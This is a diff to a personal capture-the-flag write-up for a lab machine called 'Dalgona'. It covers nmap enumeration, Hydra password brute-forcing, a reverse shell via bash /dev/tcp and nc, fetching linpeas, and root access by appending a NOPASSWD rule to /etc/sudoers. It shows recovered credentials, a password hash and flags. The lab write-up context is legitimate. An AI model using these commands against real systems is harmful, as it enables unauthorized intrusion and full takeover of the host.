@@ -1,5 +1,7 @@
-Dalgona
+# Dalgona
 
+## Enumeration
+```bash
 ┌──(marius㉿localhost)-[~/CTF/Hydra/Delgona]
 └─$ nmap -sV -p- -sC 10.10.115.182 -oX nmap.out 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 01:03 BST
@@ -105,101 +107,12 @@ PORT      STATE SERVICE        VERSION
 60177/tcp open  tcpwrapped
 60179/tcp open  tcpwrapped
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
-└─$ nmap -p-  10.10.245.36 
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 10:01 BST
-Nmap scan report for 10.10.245.36
-Host is up (0.035s latency).
-Not shown: 65450 closed tcp ports (conn-refused)
-PORT      STATE SERVICE
-22/tcp    open  ssh
-23/tcp    open  telnet
-80/tcp    open  http
-88/tcp    open  kerberos-sec
-106/tcp   open  pop3pw
-194/tcp   open  irc
-389/tcp   open  ldap
-464/tcp   open  kpasswd5
-636/tcp   open  ldapssl
-750/tcp   open  kerberos
-775/tcp   open  entomb
-777/tcp   open  multiling-http
-779/tcp   open  unknown
-783/tcp   open  spamassassin
-808/tcp   open  ccproxy-http
-873/tcp   open  rsync
-1001/tcp  open  webpush
-1178/tcp  open  skkserv
-1210/tcp  open  eoss
-1236/tcp  open  bvcontrol
-1300/tcp  open  h323hostcallsc
-1313/tcp  open  bmc_patroldb
-1314/tcp  open  pdps
-1529/tcp  open  support
-2000/tcp  open  cisco-sccp
-2003/tcp  open  finger
-2121/tcp  open  ccproxy-ftp
-2150/tcp  open  dynamic3d
-2600/tcp  open  zebrasrv
-2601/tcp  open  zebra
-2602/tcp  open  ripd
-2603/tcp  open  ripngd
-2604/tcp  open  ospfd
-2605/tcp  open  bgpd
-2606/tcp  open  netmon
-2607/tcp  open  connection
-2608/tcp  open  wag-service
-2988/tcp  open  hippad
-2989/tcp  open  zarkov
-4224/tcp  open  xtell
-4557/tcp  open  fax
-4559/tcp  open  hylafax
-4600/tcp  open  piranha1
-5051/tcp  open  ida-agent
-5052/tcp  open  ita-manager
-5151/tcp  open  esri_sde
-5354/tcp  open  mdnsresponder
-5355/tcp  open  llmnr
-5432/tcp  open  postgresql
-5555/tcp  open  freeciv
-5666/tcp  open  nrpe
-5667/tcp  open  unknown
-5674/tcp  open  hyperscsi-port
-5675/tcp  open  v5ua
-5680/tcp  open  canna
-6346/tcp  open  gnutella
-6514/tcp  open  syslog-tls
-6566/tcp  open  sane-port
-6667/tcp  open  irc
-8021/tcp  open  ftp-proxy
-8081/tcp  open  blackice-icecap
-8088/tcp  open  radan-http
-8990/tcp  open  http-wmap
-9098/tcp  open  unknown
-9359/tcp  open  unknown
-9418/tcp  open  git
-9673/tcp  open  unknown
-10000/tcp open  snet-sensor-mgmt
-10081/tcp open  famdc
-10082/tcp open  amandaidx
-10083/tcp open  amidxtape
-11201/tcp open  smsqp
-15345/tcp open  xpilot
-17001/tcp open  unknown
-17002/tcp open  unknown
-17003/tcp open  unknown
-17004/tcp open  unknown
-20011/tcp open  unknown
-20012/tcp open  ss-idi-disc
-24554/tcp open  binkp
-27374/tcp open  subseven
-30865/tcp open  unknown
-57000/tcp open  unknown
-60177/tcp open  unknown
-60179/tcp open  unknown
+### I found a user who is called player456 with ferox-buster
 
-player456
-
+## Exploitation
+```bash
 hydra -l/L <user> -p/P <wordlist> http-get "PATH" -t 64
 
 └─$ hydra -l player456 -P /usr/share/wordlists/rockyou.txt 10.10.248.49 http-get /lick/ide -t 64
@@ -211,27 +124,42 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-28 17:11:
 [DATA] attacking http-get://10.10.248.49:80/lick/ide
 [STATUS] 15542.00 tries/min, 15542 tries in 00:01h, 14328857 to do in 15:22h, 64 active
 [80][http-get] host: 10.10.248.49   login: player456   password: sugardaddy
+```
 
+### I use a github repo to exploit the ide which is given on the website
+```bash
 └─$ python2 exploit.py http://player456:sugardaddy@10.10.248.49/lick/ide/ 'player456' 'sugardaddy' 10.8.37.214 4444 linux 
 
 └─$ echo 'bash -c "bash -i >/dev/tcp/10.8.37.214/4445 0>&1 2>&1"' | nc -lnvp 4444
 listening on [any] 4444 ...
 
+```
+## User FLAG
 
-EPI{900d_ra1n_kN0w2_73H_B357_71m3_70_phALL}
+```cat  /home/player456/user.txt``` : EPI{900d_ra1n_kN0w2_73H_B357_71m3_70_phALL}
 
+## Privilege Escalation
+
+```bash
 wget http://10.8.37.214:8000/linpeas.sh
 
-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVHSInmKKk3Z3UHbvtH9LHOnWkDTnKFtoPTRMI2+J+a mariusmarolleau@gmail.com
+
+chmod +x linpeas.sh
+./linpeas.sh
 
 -rw-r--r-- 1 root root 48 Jan 25  2022 /etc/apache2/.htpasswd
 player456:$apr1$wfwEBJia$/poCTNONvBf5R4yFYZE7z1
+```
 
-the binary /usr/bin/squidagame has the same behavior as tee command -> GTFObins
-
+### The binary /usr/bin/squidagame has the same behavior as tee command -> GTFObins
+```bash
 echo 'player456 ALL=(ALL) NOPASSWD:ALL' | sudo /usr/bin/squidgame -a /etc/sudoers
 
 cd /root
-cat `ls` : EPI{F0rTy_F1V3_P01nt_S1X_b1ll10n}
+```
+
+## Root FLAG
+
+```cat `ls` ``` : EPI{F0rTy_F1V3_P01nt_S1X_b1ll10n}
 
 
